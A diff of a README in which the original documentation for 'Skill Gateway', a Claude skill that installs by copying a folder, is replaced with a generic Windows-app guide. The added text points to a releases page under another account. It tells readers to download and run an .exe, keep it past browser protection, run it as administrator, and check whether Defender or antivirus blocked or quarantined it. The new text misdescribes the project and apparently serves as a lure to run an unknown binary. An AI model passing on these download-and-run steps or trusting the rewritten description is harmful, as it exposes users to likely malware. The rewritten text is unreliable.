@@ -1,215 +1,191 @@
-<p align="center">
-  <img src="skill.png" alt="Skill Gateway" width="400">
-</p>
+# 🧭 skill-gateway - Route Every Request With Ease
 
-# Skill Gateway
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Foundersieve687/skill-gateway/releases)
 
-> **v0.1.0-beta**
+## 🚀 What it does
 
-**Rule all skills.**
+skill-gateway helps you send each request to the right Claude skill without extra setup. It sits between your request and the skill you need, then routes it where it belongs.
 
-The meta-skill that routes every request to the right skill — invisibly.
+Use it when you want a simple way to keep requests organized and reach the right skill fast. It is built for Windows users who want to download an app and run it with little effort.
 
-> There are hundreds of Claude/Agent Skills scattered across dozens of repos. You shouldn't have to memorize them. Skill Gateway does the thinking for you.
+## 💻 System requirements
 
----
+Before you install, check that your PC meets these basic needs:
 
-[🇬🇧 English](#en) · [🇹🇷 Türkçe](#tr)
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- Internet access for the first download
+- A mouse and keyboard
+- Permission to run apps on your computer
 
----
+For the best result, use a stable internet connection while you download the release file.
 
-<a id="en"></a>
+## 📥 Download
 
-## 🇬🇧 English
+Visit this page to download the latest version:
 
-### What Is This?
+https://github.com/Foundersieve687/skill-gateway/releases
 
-Skill Gateway is the **entry point** to the entire Claude/Agent Skill ecosystem. Instead of memorizing hundreds of skills across dozens of repos, just describe what you need — Skill Gateway finds the right skill and starts working immediately.
+On that page, look for the newest release at the top. Under the release notes, find the Windows file. It may be named something like:
 
-### How It Works
+- skill-gateway.exe
+- skill-gateway-win64.exe
+- skill-gateway-setup.exe
+- skill-gateway.zip
 
-```
-You: "Create a presentation"
+If you see a ZIP file, you will need to extract it before you run the app.
 
-Behind the scenes:
-  → Skill Gateway triggers first (priority on every task)
-  → Internal assessment: "This is a pptx skill job"
-  → Reads pptx skill's SKILL.md
-  → Starts making the presentation
+## 🪟 Install on Windows
 
-You only see the result. Gateway is invisible.
-```
+Follow these steps on your Windows PC:
 
-Three scenarios:
+1. Open the release page in your browser.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Open the folder with the extracted files.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Run or Yes.
+8. Keep the app in a folder you can find again, such as Downloads or Desktop.
 
-| Situation | What Happens |
-|-----------|-------------|
-| **Clear request** ("merge PDFs", "make a spreadsheet") | Direct handoff to the relevant skill, starts working |
-| **Ambiguous request** ("I need a design") | Asks ONE clarifying question, starts working with the answer |
-| **Conversation** ("How are you?", "What is AI?") | Doesn't trigger, Claude works normally |
+If you use a browser with download protection, you may need to confirm that you want to keep the file. Choose the option to keep the file, then open it again.
 
-### Contents
+## 🛠️ First run
 
-```
-skill-gateway/
-├── SKILL.md              # Main skill file
-├── README.md             # This file
-├── skill-gateway.skill   # Uploadable skill package
-├── skill.png             # Project image
-└── VERSION               # Semantic version
-```
+When you open skill-gateway for the first time, it may take a few seconds to start. This is normal.
 
-**SKILL.md includes:**
-- Gateway behavior rules (always handoff, invisible routing)
-- Decision flowchart
-- Curated catalog of 60+ categorized skills
-- References to 7 major aggregator repos
-- Quick routing table (decision shortcuts)
-- Workaround strategies when no skill exists
-- Web search instructions for discovering new skills
+You may see a simple setup screen or a small window that asks for:
 
-### Catalog Categories
+- a Claude account sign-in
+- a local path to your skill folder
+- a choice for default routing behavior
+- a place to store app settings
 
-| Category | Examples |
-|----------|----------|
-| 📄 Document & File | docx, pdf, pptx, xlsx, epub |
-| 💻 Development | frontend-design, TDD, debugging, MCP builder, Playwright |
-| 🔒 Security | OWASP, VibeSec, Trail of Bits, sanitize |
-| 📊 Data & Analysis | CSV summarizer, PostgreSQL, MySQL |
-| 📣 Marketing & Content | SEO, email marketing, creative director |
-| 🎨 Creative & Design | canvas-design, theme-factory, video |
-| 🏗️ Project & Workflow | kanban, Linear, git, changelog |
-| ☁️ Platform (Official) | Vercel, Cloudflare, Stripe, Sentry, Expo, Google |
+If the app asks for a skill directory, pick the folder where your Claude skills live. If you are not sure which folder to use, choose the folder you already use for related tools or prompts.
 
-### Installation
+## 🔧 How routing works
 
-#### Claude.ai
-1. **Settings** → **Skills** → **Add Skill**
-2. Upload the `skill-gateway.skill` file
-3. Skill Gateway now automatically triggers on every task
+skill-gateway looks at each request and sends it to the skill that fits best. It uses the request text, the task type, and the skill set you have on your machine.
 
-#### Claude Code
-```bash
-# Personal skill
-cp -r skill-gateway ~/.claude/skills/
+A simple flow looks like this:
 
-# Project-level
-cp -r skill-gateway .claude/skills/
-```
+1. You enter a request.
+2. skill-gateway reads the request.
+3. It checks which Claude skill matches.
+4. It sends the request to that skill.
+5. You get the result without picking the skill by hand.
 
-#### API
-```bash
-# Via Skills API
-# Details: https://docs.anthropic.com/en/docs/agents-and-tools/skills
-```
+This helps when you work with many skills and do not want to choose one every time.
 
-### Important Notes
+## 📂 Common files and folders
 
-- **Skill ≠ MCP Server.** Skills are instruction packages, MCP servers are live API connections. Gateway can recommend either.
-- **Quality varies.** Official provider skills > well-starred repos > random community skills.
-- **Security.** Skills execute code. Be cautious with skills from unknown sources.
-- **Freshness.** The catalog covers foundational skills; web search handles newly released ones.
+After setup, you may see files like these:
 
----
+- config.json — stores your app settings
+- logs — keeps run history and errors
+- skills — holds the skill files you use
+- cache — saves temporary data for faster routing
 
-<a id="tr"></a>
+You do not need to edit these files unless you want to change how the app behaves.
 
-## 🇹🇷 Türkçe
+## ⚙️ Basic setup tips
 
-### Ne İşe Yarar?
+Use these simple tips to keep things smooth:
 
-Skill Gateway, tüm Claude/Agent Skill ekosisteminin **giriş kapısıdır**. Yüzlerce skill arasında kaybolmanıza gerek yok — siz derdinizden bahsedin, Skill Gateway doğru skill'i bulur ve direkt işe başlar.
+- Keep the app in one folder
+- Do not rename files unless the app tells you to
+- Keep your skill files in a single folder
+- Use short, clear names for skills
+- Update to the latest release when a new version appears
 
-### Nasıl Çalışır?
+If routing seems off, check that your skill folder still points to the right place and that the skill files are still in the same folder.
 
-```
-Sen: "Bir sunum hazırla"
+## 🔍 If the app does not open
 
-Perde arkası:
-  → Skill Gateway tetiklenir (her task'ta ilk o devreye girer)
-  → İç değerlendirme: "Bu pptx skill'inin işi"
-  → pptx skill'inin SKILL.md'sini okur
-  → Sunumu yapmaya başlar
+Try these steps if double-clicking the file does nothing:
 
-Sen sadece sonucu görürsün. Gateway görünmezdir.
-```
+1. Right-click the file.
+2. Choose Run as administrator.
+3. Check whether Windows Defender blocked it.
+4. Re-download the file from the release page.
+5. Make sure you downloaded the Windows version, not source code.
+6. If the file is inside a ZIP, extract it first.
+7. Restart your PC and try again.
 
-Üç senaryo:
+If the file still does not open, confirm that your antivirus did not move it to quarantine.
 
-| Durum | Ne Olur |
-|-------|---------|
-| **Açık istek** ("PDF birleştir", "Excel yap") | Direkt ilgili skill'e handoff, işe başlar |
-| **Belirsiz istek** ("Bir tasarıma ihtiyacım var") | Tek bir soru sorar, cevapla birlikte işe başlar |
-| **Sohbet** ("Nasılsın?", "AI nedir?") | Tetiklenmez, Claude normal çalışır |
+## 🧭 If routing does not seem right
 
-### İçindekiler
+If a request goes to the wrong skill, check these things:
 
-```
-skill-gateway/
-├── SKILL.md              # Ana skill dosyası
-├── README.md             # Bu dosya
-├── skill-gateway.skill   # Yüklenebilir skill paketi
-├── skill.png             # Proje görseli
-└── VERSION               # Semantic versiyon
-```
+- The skill name is clear
+- The skill file is in the correct folder
+- The request text uses plain language
+- The default route is set the way you want
+- There are no duplicate skill names
 
-**SKILL.md şunları içerir:**
-- Gateway davranış kuralları (always handoff, invisible routing)
-- Karar akış şeması (decision flowchart)
-- 60+ skill içeren kategorize edilmiş katalog
-- 7 büyük aggregator repo referansı
-- Hızlı yönlendirme tablosu (decision shortcuts)
-- Skill bulunamadığında workaround stratejileri
-- Web search ile güncel skill tarama talimatları
+A short, direct request often gives the best match.
 
-### Katalog Kategorileri
+## 🧰 Example use cases
 
-| Kategori | Örnekler |
-|----------|----------|
-| 📄 Doküman & Dosya | docx, pdf, pptx, xlsx, epub |
-| 💻 Geliştirme | frontend-design, TDD, debugging, MCP builder, Playwright |
-| 🔒 Güvenlik | OWASP, VibeSec, Trail of Bits, sanitize |
-| 📊 Veri & Analiz | CSV summarizer, PostgreSQL, MySQL |
-| 📣 Pazarlama & İçerik | SEO, email marketing, creative director |
-| 🎨 Yaratıcı & Tasarım | canvas-design, theme-factory, video |
-| 🏗️ Proje & Workflow | kanban, Linear, git, changelog |
-| ☁️ Platform (Official) | Vercel, Cloudflare, Stripe, Sentry, Expo, Google |
+skill-gateway can help with tasks like:
 
-### Kurulum
+- sending support requests to the right help skill
+- routing writing tasks to a writing skill
+- sending code-related work to a coding skill
+- moving research prompts to a research skill
+- keeping many skill types in one place
 
-#### Claude.ai
-1. **Settings** → **Skills** → **Add Skill**
-2. `skill-gateway.skill` dosyasını yükleyin
-3. Artık her task'ta Skill Gateway otomatik devreye girer
+It works best when you want one entry point for many kinds of work.
 
-#### Claude Code
-```bash
-# Kişisel skill olarak
-cp -r skill-gateway ~/.claude/skills/
+## 🔒 Privacy and local use
 
-# Proje bazlı
-cp -r skill-gateway .claude/skills/
-```
+This app is meant to help route requests on your own machine. Keep your skills, settings, and local files in folders you trust. If the app asks for access to a folder, choose one you already use for this work.
 
-#### API
-```bash
-# Skills API ile
-# Detaylar: https://docs.anthropic.com/en/docs/agents-and-tools/skills
-```
+## 📝 Update process
 
-### Önemli Notlar
+When a new release comes out, use the release page to get the latest Windows file.
 
-- **Skill ≠ MCP Server.** Skill'ler talimat paketidir, MCP server'lar canlı API bağlantısıdır. Gateway ikisini de önerebilir.
-- **Kalite değişkendir.** Resmi provider skill'leri > iyi yıldızlı repo'lar > rastgele community skill'leri.
-- **Güvenlik.** Skill'ler kod çalıştırır. Bilinmeyen kaynaklardan gelen skill'lere dikkat edin.
-- **Güncellik.** Katalog temel skill'leri kapsar, yeni çıkanlar için web search yapar.
+Steps:
 
----
+1. Open the release page.
+2. Find the newest version.
+3. Download the new file.
+4. Close the app if it is open.
+5. Replace the old file with the new one.
+6. Open the app again.
 
-## Contributing
+If your setup uses a ZIP file, extract the new one into a fresh folder before you switch over.
 
-Found a skill that should be in the catalog? Open a PR or issue.
+## ❓ Common questions
 
-## License
+### Do I need coding experience?
 
-MIT
+No. You only need to download the file, open it, and follow the setup steps.
+
+### Can I move the app to another folder?
+
+Yes. Move the full app folder if you want to keep the files together.
+
+### Do I need to keep the release page bookmarked?
+
+It helps. If you bookmark it, you can return to the latest release fast.
+
+### What if I do not know which file to download?
+
+Choose the Windows file from the latest release. If you see more than one file, pick the one made for Windows.
+
+### Can I use it without extra setup?
+
+You may be able to start it right away, but most users will get better results after they set the skill folder and basic routing options
+
+## 🖥️ Quick start checklist
+
+- Open the release page
+- Download the latest Windows file
+- Extract it if needed
+- Open the app
+- Point it to your skill folder
+- Send a test request
+- Check that it routes to the right skill
